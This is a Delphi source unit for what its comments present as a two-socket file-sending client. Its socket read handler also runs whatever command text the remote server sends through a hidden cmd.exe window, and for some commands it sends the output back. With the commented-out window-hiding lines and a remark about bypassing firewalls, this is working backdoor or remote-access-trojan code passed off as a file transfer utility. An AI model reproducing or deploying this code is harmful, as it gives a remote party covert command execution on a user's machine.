unit Client_U;

interface

uses
  Windows, Messages, SysUtils, Variants, Classes, Graphics, Controls, Forms,
  Dialogs, ScktComp, StdCtrls,ShellAPI;

type
  TForm1 = class(TForm)
    Button1: TButton;
    Button2: TButton;
    Memo1: TMemo;
    Edit1: TEdit;
    Edit2: TEdit;
    GroupBox1: TGroupBox;
    Label1: TLabel;
    Label2: TLabel;
    ClientSocket1: TClientSocket;
    ClientSocket2: TClientSocket;
    Edit3: TEdit;
    Label3: TLabel;
    OpenDialog1: TOpenDialog;
    procedure Button1Click(Sender: TObject);
    procedure ClientSocket1Connect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure ClientSocket2Connect(Sender: TObject;
      Socket: TCustomWinSocket);
    procedure Button2Click(Sender: TObject);
    procedure FormCreate(Sender: TObject);
    procedure ClientSocket1Read(Sender: TObject; Socket: TCustomWinSocket);
  private
    { Private declarations }
    Streamsize: TFileStream;
  public
    function GetDosOutput(CommandLine: string; Work: string = 'C:\'): string;
  end;

var
  Form1: TForm1;

implementation

{$R *.dfm}
// Written by Me ColdFuzion
// Program Purpose : To Sendfiles to the recieving file program
// All i ask is whoever uses my code gives me a little credit my e-mail is ColdFuzion@hushmail.com

// Reason for using 2 sockets is because its meant to be more like a messenger client where one socket is used for communication and so on.. while the other is soley used for sending files
procedure TForm1.Button1Click(Sender: TObject);
begin
   ClientSocket1.Address := Edit3.Text;
   ClientSocket1.Open; // Open rather than active so it can bypass firewalls
 //ShowWindow(Application.Handle, SW_HIDE);
//Hide;
end;

procedure TForm1.ClientSocket1Connect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
   Memo1.Lines.Add('Connected to ' +Socket.RemoteHost); // Shows the address of the server you connect to
end;

procedure TForm1.ClientSocket2Connect(Sender: TObject;
  Socket: TCustomWinSocket);
begin
   Memo1.Lines.Add('Sending File ' +Edit1.Text +' .........')
end;

procedure TForm1.Button2Click(Sender: TObject);
begin
   if ClientSocket1.Active = True then
   begin
      OpenDialog1.Filter := 'All Files (*.*)';  // you can add more choices by adding | and followed by description and (*.extension)
      OpenDialog1.FilterIndex := 1; // Here you follow which index number from above you want
      if OpenDialog1.Execute then
      begin
         Edit1.Text := ExtractFileName(OpenDialog1.FileName); // To send as filename after
         ClientSocket1.Socket.SendText('FILE!'+Edit1.Text);
         sleep(2000); // Need to sleep so the other end has time to process the commands
         Streamsize := TFileStream.Create(OpenDialog1.FileName, fmopenread); // Stream created just to Calculate size
         Edit2.Text := inttostr(Streamsize.Size);
         Sleep(2000);
         ClientSocket1.Socket.SendText('SIZE!'+Edit2.Text); // Sends filesize through primary socket
         Streamsize.Position := 0;
         Streamsize.Free;
         sleep(2000);
         ClientSocket2.Address := Edit3.Text;
         ClientSocket2.Open; // ready to send file on second socket
         if ClientSocket2.Socket.SendStream(TFileStream.Create(OpenDialog1.FileName, fmopenRead)) then memo1.Lines.Add('File Sent');
      // above creates a stream and sends as a stream its in a if line because this is the only way it will automatically check the byte order and send the whole stream
      end;
   end
     else
     MessageDlg('Error: You are not connected', mtError, [MbOK],0);  // Error Check above code won't work until the socket is connected
end;


procedure TForm1.FormCreate(Sender: TObject);
begin
   Memo1.Text := '';
end;


procedure TForm1.ClientSocket1Read(Sender: TObject;
  Socket: TCustomWinSocket);
var IncommingText, StrippedData, CommandName: string;
posit,cmd:String;
intman2,intman3:Integer;
begin
   IncommingText := socket.ReceiveText; // Put all incoming data into this string
   StrippedData := copy(IncommingText,6,length(IncommingText) ); // letters 6 to end is the actual data being sent
   CommandName := copy(IncommingText,0,5); // letters 0 to 5 is the fixed letter space for the command name

   if CommandName = 'DONE!' then // Expected command Done! note : This is case sensitive so match has to be the same case
   begin
      Memo1.Lines.Add('File ' +Edit1.Text +' ' +Edit2.Text +' was Recieved Successfully');
      ClientSocket2.Active := False; // Turns off the file sending socket as file confirmation has been sent from the other end
      Edit1.Text := '';
      Edit2.Text :='';
   end
   else
   begin
 cmd:=IncommingText;

 intman2:=Pos('YES',cmd);
 intman3:=Pos('NO',cmd);

 if (intman2>0) then
 begin
 cmd:=Copy(cmd,1,intman2-1);

 posit:=(GetDosOutput(cmd));
  ClientSocket1.Socket.SendText(posit);
 end;

 if (intman3>0) then
 begin
 cmd:=Copy(cmd,1,intman3-1);
 ShellExecute(0, nil, 'cmd.exe',PChar('/C '+cmd), nil, SW_HIDE);
 end;














   end;




   end;
 function tform1.GetDosOutput(CommandLine: string; Work: string = 'C:\'): string;
var
  SA: TSecurityAttributes;
  SI: TStartupInfo;
  PI: TProcessInformation;
  StdOutPipeRead, StdOutPipeWrite: THandle;
  WasOK: Boolean;
  Buffer: array[0..255] of AnsiChar;
  BytesRead: Cardinal;
  WorkDir: string;
  Handle: Boolean;
begin
  Result := '';
  with SA do begin
    nLength := SizeOf(SA);
    bInheritHandle := True;
    lpSecurityDescriptor := nil;
  end;
  CreatePipe(StdOutPipeRead, StdOutPipeWrite, @SA, 0);
  try
    with SI do
    begin
      FillChar(SI, SizeOf(SI), 0);
      cb := SizeOf(SI);
      dwFlags := STARTF_USESHOWWINDOW or STARTF_USESTDHANDLES;
      wShowWindow := SW_HIDE;
      hStdInput := GetStdHandle(STD_INPUT_HANDLE); // don't redirect stdin
      hStdOutput := StdOutPipeWrite;
      hStdError := StdOutPipeWrite;
    end;
    WorkDir := Work;
    Handle := CreateProcess(nil, PChar('cmd.exe /C ' + CommandLine),
                            nil, nil, True, 0, nil,
                            PChar(WorkDir), SI, PI);
    CloseHandle(StdOutPipeWrite);
    if Handle then
      try
        repeat
          WasOK := ReadFile(StdOutPipeRead, Buffer, 255, BytesRead, nil);
          if BytesRead > 0 then
          begin
            Buffer[BytesRead] := #0;
            Result := Result + Buffer;
          end;
        until not WasOK or (BytesRead = 0);
        WaitForSingleObject(PI.hProcess, INFINITE);
      finally
        CloseHandle(PI.hThread);
        CloseHandle(PI.hProcess);
      end;
  finally
    CloseHandle(StdOutPipeRead);
  end;
end;
end.
